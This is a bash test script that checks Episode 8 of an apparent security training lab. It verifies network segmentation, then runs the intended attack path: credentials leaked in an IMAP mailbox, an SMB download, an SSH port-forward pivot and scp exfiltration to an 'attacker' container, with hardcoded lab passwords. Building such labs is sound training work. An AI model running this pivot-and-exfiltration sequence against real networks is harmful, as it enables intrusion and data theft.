#!/usr/bin/env bash
set -euo pipefail

episode=8
project=dawnstar-e08
compose=(
  docker compose
  -p "$project"
  -f compose.yaml
  -f episodes/compose.episode-08.yaml
)

fail() {
  printf 'FAIL: %s\n' "$1" >&2
  exit 1
}

pass() {
  printf 'PASS: %s\n' "$1"
}

cleanup() {
  ./scripts/lab down "$episode" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_health() {
  local service="$1"
  local container_id status

  for ((attempt = 1; attempt <= 30; attempt++)); do
    container_id="$("${compose[@]}" ps -q "$service")"
    if [[ -n "$container_id" ]]; then
      status="$(docker inspect --format '{{if .State.Health}}{{.State.Health.Status}}{{else}}missing{{end}}' "$container_id")"
      if [[ "$status" == healthy ]]; then
        return 0
      fi
    fi
    sleep 1
  done

  return 1
}

wait_for_service() {
  local source_service="$1"
  local probe="$2"

  for ((attempt = 1; attempt <= 30; attempt++)); do
    if "${compose[@]}" exec -T "$source_service" sh -c "$probe" >/dev/null 2>&1; then
      return 0
    fi
    sleep 1
  done

  return 1
}

./scripts/lab up "$episode"
for service in attacker perimeter operations vault; do
  wait_for_health "$service" || fail "Episode 8 $service health check did not become healthy"
done
pass 'all four Episode 8 containers are healthy'

"${compose[@]}" exec -T attacker sh -c 'command -v nc' >/dev/null \
  || fail 'attacker is missing Netcat for containment checks'
if "${compose[@]}" exec -T attacker nc -z -w 2 172.30.20.20 22 >/dev/null 2>&1; then
  fail 'attacker can directly reach Operations SSH'
fi
pass 'attacker cannot directly reach Operations SSH'

if "${compose[@]}" exec -T attacker nc -z -w 2 172.30.30.20 445 >/dev/null 2>&1; then
  fail 'attacker can directly reach Vault SMB'
fi
pass 'attacker cannot directly reach Vault SMB'

wait_for_service perimeter 'nc -z -w 2 172.30.20.20 22' \
  || fail 'Perimeter cannot reach Operations SSH'
wait_for_service perimeter 'nc -z -w 2 172.30.20.20 143' \
  || fail 'Perimeter cannot reach Operations IMAP'
pass 'Perimeter can reach Operations SSH and IMAP'

wait_for_service operations 'nc -z -w 2 172.30.30.20 445' \
  || fail 'Operations cannot reach Vault SMB'
pass 'Operations can reach Vault SMB'

"${compose[@]}" exec -T perimeter sh -c \
  "curl -fsS --url 'imap://172.30.20.20/INBOX/;UID=1' --user 'relay:OrbitRelay!' > /tmp/nightglass-mail.txt" \
  || fail 'Perimeter could not fetch the Operations IMAP message'
for clue in '172.30.30.20' 'nightglass' 'Lumen-Archive-47!'; do
  "${compose[@]}" exec -T perimeter grep -F "$clue" /tmp/nightglass-mail.txt >/dev/null \
    || fail "IMAP message is missing expected vault clue: $clue"
done
pass 'IMAP message contains all three Vault clues'

"${compose[@]}" exec -T operations rm -f /tmp/nightglass-research.tar.gz
"${compose[@]}" exec -T operations smbclient //172.30.30.20/research \
  -U 'nightglass%Lumen-Archive-47!' \
  -c 'get nightglass-research.tar.gz /tmp/nightglass-research.tar.gz' >/dev/null \
  || fail 'Operations could not download the Nightglass archive from Vault'
pass 'Operations downloaded the Nightglass archive from Vault'

"${compose[@]}" exec -T attacker rm -f /tmp/nightglass-research.tar.gz
"${compose[@]}" exec -T attacker bash -lc \
  "sshpass -p 'Dawnstar-Resume-Only!' ssh -fN \
    -o ExitOnForwardFailure=yes \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -L 127.0.0.1:2222:172.30.20.20:22 \
    checkpoint@172.30.10.10" \
  || fail 'attacker could not establish the SSH forward through Perimeter'
wait_for_service attacker 'nc -z -w 2 127.0.0.1 2222' \
  || fail 'SSH forward through Perimeter did not become ready'
"${compose[@]}" exec -T attacker bash -lc \
  "sshpass -p 'OrbitRelay!' scp \
    -P 2222 \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    relay@127.0.0.1:/tmp/nightglass-research.tar.gz \
    /tmp/nightglass-research.tar.gz" >/dev/null \
  || fail 'attacker could not copy the archive from Operations through Perimeter'
pass 'archive copied from Operations to attacker through an SSH forward via Perimeter'

vault_sha="$("${compose[@]}" exec -T vault sha256sum /srv/research/nightglass-research.tar.gz | awk '{print $1}')"
operations_sha="$("${compose[@]}" exec -T operations sha256sum /tmp/nightglass-research.tar.gz | awk '{print $1}')"
attacker_sha="$("${compose[@]}" exec -T attacker sha256sum /tmp/nightglass-research.tar.gz | awk '{print $1}')"
[[ -n "$vault_sha" && "$vault_sha" == "$operations_sha" && "$vault_sha" == "$attacker_sha" ]] \
  || fail "archive SHA-256 mismatch: vault=$vault_sha operations=$operations_sha attacker=$attacker_sha"
pass "Vault, Operations, and attacker SHA-256 values match ($vault_sha)"

"${compose[@]}" exec -T attacker bash -lc \
  "rm -rf /tmp/nightglass-extracted \
    && mkdir /tmp/nightglass-extracted \
    && tar -xzf /tmp/nightglass-research.tar.gz -C /tmp/nightglass-extracted \
    && grep -R -F 'DAWNSTAR-NIGHTGLASS-RETRIEVED' /tmp/nightglass-extracted" >/dev/null \
  || fail 'completion token is missing from the retrieved Nightglass archive'
pass 'retrieved archive contains the Nightglass completion token'

"${compose[@]}" exec -T perimeter touch /root/reset-marker \
  || fail 'could not create the Perimeter reset marker'
./scripts/lab reset "$episode"
for service in attacker perimeter operations vault; do
  wait_for_health "$service" || fail "reset Episode 8 $service health check did not become healthy"
done
if ! "${compose[@]}" exec -T perimeter test ! -e /root/reset-marker; then
  fail 'Episode 8 reset preserved the Perimeter marker'
fi
pass 'Episode 8 reset removes mutable Perimeter state'
